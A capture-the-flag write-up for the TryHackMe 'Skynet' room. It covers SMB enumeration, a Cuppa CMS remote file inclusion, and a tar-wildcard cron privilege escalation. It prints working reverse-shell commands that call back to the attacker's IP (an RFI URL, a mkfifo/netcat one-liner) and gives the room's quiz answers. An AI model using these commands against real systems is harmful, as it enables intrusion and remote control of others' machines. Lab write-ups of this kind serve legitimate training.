# Skynet-TryHackMe WriteUp by <span style="color:#DCD0FF;font-family:'sans-serif'">ic3b3rg</span>

## Directory enumeration with gobuster 
```
gobuster dir -u "http://10.10.169.231/" -w /usr/share/wordlists/dirb/common.txt
```

I found an interesting file-path which renders a login interface-
 ```http://10.10.169.231/squirrelmail/src/login.php```
 
## Nmap scan
After a simple  nmap scan we see that have the following ports open.

```
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 60
80/tcp  open  http         syn-ack ttl 60
110/tcp open  pop3         syn-ack ttl 60
139/tcp open  netbios-ssn  syn-ack ttl 60
143/tcp open  imap         syn-ack ttl 60
445/tcp open  microsoft-ds syn-ack ttl 60

```

We have port 445 open which is related to the Server Message Block protocol.

## SMB Enumeration

```nmap -p 445 $ip --script=smb-enum-shares```

We get the following,

```
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.169.231\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.169.231\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.169.231\milesdyson:              <--- Potential username leak
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share    
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share         <--- Interesting SMB share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.169.231\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>


```
Here we can see that, along with the confirmation of the existence of an anonymous directory in the SMB enumeration, we also found the potential username of the owner that is , ```milesdyson```

Lets connect with SMB with smbclient,
```
smbclient \\\\$ip\\anonymous
```
### Examining acquired files and logging into the user's email
After getting all the files from the directory,
```
$ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson

$ cat log1.txt
cyborg007haloterminator
terminator22596
<.... Redacted ....>
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

in log1.txt we see some sort of wordlist, maybe they are passwords. We can bruteforce them in out login link with our username using hydra. But here ```cyborg007haloterminator``` is mentioned twice.
So, in the login url, putting this password and the aforementioned username logs us in.

We can answer a question up until our finding.

``` 
1. What is Miles password for his emails? 
Ans: cyborg007haloterminator 
```

We can see three emails on our logged account.

The first email gives us the smb password after it was changed. Which is, ``` )s{A&2Z=F^n_E.B` ```

Lets log in to smb again with the password.

### Logging into the SMB of milesdyson

Use the command and login to the account using the password retrieved from the compromised email account. 
```
smbclient \\\\$ip\\milesdyson -U milesdyson
```

After some looking around, i stumble upon the file /notes/important.txt
which has the following data,

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

We can answer a question with our findings till now.

``` 
2. What is the hidden directory? 
Ans: /45kra24zxs28v3yd
```

Lets browse to the directory.
```http://10.10.134.226/45kra24zxs28v3yd/```

This seems to be his personal page.

## Exploiting Remote File Inclusion Vulnerability

Now that we have found a directory, lets enumerate the sub-directories under this directory.

```
gobuster dir -u "http://10.10.134.226/45kra24zxs28v3yd/" -w /usr/share/wordlists/dirb/common.txt
```

We find an interesting page with this enumeration which takes us to a Cuppa CMS Login page.

```http://10.10.134.226/45kra24zxs28v3yd/administrator/```

Using any of the previous credentials, I could not login into the system.

But there is a Question that could be answered without our finding.

``` 
3. What is the vulnerability called when you can include a remote file for malicious purposes?
Ans: Remote File Inclusion
```

So this indicates that we could exploit the version of the Cuppa CMS.
Upon searching "Cuppa CMS Remote File Inclusion", I found this promising exploitDB script ```https://www.exploit-db.com/exploits/25971```

According to the exploit, there is a Remote/Local File Inclusion Vulnerability on the `urlConfig` parameter of the `alertConfigField.php` file on `/alerts` directory.

So what we have to do is, create our python http server an put our php reverse shell on it.
You can get it on `www.revshells.com`

Host an http server on port 4000.
`python3 -m http.server 4000`

Don't forget to change the ip address and the port number. I set it to 1234.
Setup a listener - `nc -lvnp 1234`

And this url will give us a shell.
```
http://$ip/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://$your_ip:4000/php_revshell.phtml?
```

Use this to get a better shell. 
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

The user flag is in /home/milesdyson/user.txt

``` 
4. What is the user flag?
Ans: <--Redacted-->
```

## Privilege Escalation

I tried using all the 'highly probable' exploits shown by linpeas.sh. But it didn't work.

Turns out that this one is an abuse of the wildcard (*) in linux.

Upon checking some configurations of this machine. We see that on ```/etc/crontab```
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
The purpose of /etc/crontab is to list actions which will be executed repeatedly with a certain period. 
Here, ```backup.sh``` is running as root every minute.

Let's check what's inside.
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
tar cf /home/milesdyson/backups/backup.tgz <span style="color:red">*</span>

Here we can see a vulnerable wildcard. If i have some argument (--some-argument) as a filename then it will be considered as an command tag and will execute accordingly.

Here are some of the arguments we can abuse.
```
--checkpoint-exec= <some bash command>    -> executes some bash command
--checkpoint= <time>                      -> display progress after <time> number of records
```

Lets write a file called ```shell.sh``` with some malicious command inside.
```
echo "rm /tmp/buffer;mkfifo /tmp/buffer;cat /tmp/buffer|/bin/sh -i 2>&1|nc $your_ip 2403 >/tmp/buffer" > shell.sh
```

This creates a named pipe (also known as a FIFO) named "buffer" in the "/tmp" directory. A named pipe is a special type of file that acts as a channel for communication between processes. Data written to one end of the pipe is immediately available for reading at the other end.

Then we take the content of the file and pipe it to ```/bin/sh -i``` to execute it as an interactive mode.

Then the output of the shell command is piped into the ```nc``` and sent to the attackers machine. 

The next command from the attacker machine is output as the command and written into ```/tmp/buffer```

As the ```/bin/sh -i``` command was interactive, this will execute again and form a loop maintaining stable connection.
Now we have to setup a listener on our machine on port 2403 by ```nc -lvnp 2403``` and we are done.

The root flag is in ```/root/root.txt```

``` 
5. What is the root flag?
Ans: <--Redacted-->
```
#### <span style="color:red">FAQ</span>
<strong>1. Why didn't a normal revshell like ```/bin/netcat $your_ip $port -e /bin/sh ``` work? </strong>
>  When you open your terminal you start an interactive shell, in this example using bash, your .bashrc file is automatically invoked. When this script runs, any environment variables it exports are available to every command you run in your terminal session. This method of setting environment variables in your .bashrc is the most common way that persistent environment variables are set, but your cron jobs do not invoke an interactive shell, and your .bashrc is not automatically loaded. This is true even if you specify /bin/bash as your crontab shell.
*courtesy: https://cronitor.io/guides/cron-environment-variables*

